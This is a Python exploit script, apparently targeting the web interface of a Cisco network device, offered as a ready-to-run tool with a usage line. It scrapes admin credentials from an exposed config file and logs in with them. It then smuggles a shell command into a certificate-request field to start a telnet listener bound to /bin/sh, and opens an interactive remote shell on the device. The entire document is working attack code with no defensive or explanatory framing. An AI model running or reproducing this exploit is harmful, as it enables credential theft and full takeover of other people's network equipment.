import requests
import re
import urllib3
import sys, getopt
import time
from telnetlib import Telnet
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL:@SECLEVEL=1'
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class exec:
    path = '/cgi-bin/config.exp'

    def __init__(self, url):
        self.url = url

    def getCredential(self):
        print('\x1b[3;32;40m' + 'Crawl Credential...' + '\x1b[0m')
        req = requests.get(self.url + self.path, verify=False)
        if(req.status_code != 200):
            print('\x1b[1;31;40m' + 'Target Not Vulnerable!!' + '\x1b[0m')
            sys.exit()

        result = req.text
        username = re.findall(r"USERNAME=([\w\s]+\n)", result)
        password = re.findall(r"PASSWD=([\w\s]+\n)", result)
        credential = [username[0], password[0]]
        print('\x1b[3;32;40m' + 'Credential Found[!]\n' + '\x1b[0m')
        time.sleep(2)
        return credential

    def exploit(self):
        credential = self.getCredential()
        username = credential[0].replace('\n', '')
        password = credential[1].replace('\n', '')
        
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = f"login=true&portalname=CommonPortal&password_expired=0&auth_key=1964300002&auth_server_pw=YWRtaW4%3D&md5_old_pass=&langName=ENGLISH%2CDeutsch%2CEspanol%2CFrancais%2CItaliano&changelanguage=&submitStatus=0&pdStrength=0&username={username}&password={password}&LanguageList=ENGLISH&current_password=&new_password=&re_new_password="
        print('\x1b[6;33;40m' + 'Start Exploitation...' + '\x1b[0m')
        post = requests.post(self.url + '/cgi-bin/userLogin.cgi', data=payload,
        verify=False, headers=headers)
        response = post.headers
        cookies = response['Set-Cookie']
        
        data = 'page=self_generator.htm&totalRules=33&submitStatus=1&log_ch=1&type=1&Counrty=US&state=xpl0dec&locality=xpl0dec&organization=xpl0dec&organization_unit=Bhitech&common_name=a%27%24%28telnetd%20-l%20%2Fbin%2Fsh%20-p%201790%29%27b&email=xpl0dec@mail.com&KeySize=512&valid_days=30'
        header = {'Content-Type' : 'application/x-www-form-urlencoded',
        'Cookie' : cookies}
        reqtelnet = requests.post(self.url + '/certificate_handle.htm?type=1',
        headers=header, data=data, verify=False)
        if "<meta http-equiv=refresh content='2; url=/my_certificate.htm'>" in reqtelnet.text:
            print('\x1b[3;32;40m' + 'Exploit Success[!]\n' + '\x1b[0m')
            print('Get TCP connection... ')
            print('\x1b[1;31;40m' + 'Target Pwned!!' + '\x1b[0m')
            time.sleep(3)
            if self.url.startswith('https://'):
                ipAddr = self.url.replace('https://', '').replace('/', '')
            elif self.url.startswith('http://'):
                ipAddr = self.url.replace('http://', '').replace('/', '')
            with Telnet(ipAddr, 1790) as tn:
                tn.interact()
        else:
            print('\x1b[1;31;40m' + 'Exploit Failed :(' + '\x1b[0m')
            sys.exit()
            
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage : python cisco.py -t https://targetmu")
        sys.exit()

    argumentList = sys.argv[1:]
    option = "ht:"
    long_option = ["help", "target", "port"]
    try:
         arguments, values = getopt.getopt(argumentList, option, long_option)    
         for currentArgument, currentValue in arguments:
             if currentArgument in ("-h", "--help"):
                 print("Usage : python cisco.py -t https://targetmu")
             elif currentArgument in ("-t", "--target"):
                 instance = exec(currentValue)
                 print(instance.exploit())
    except getopt.error as err:
        print(str(err))
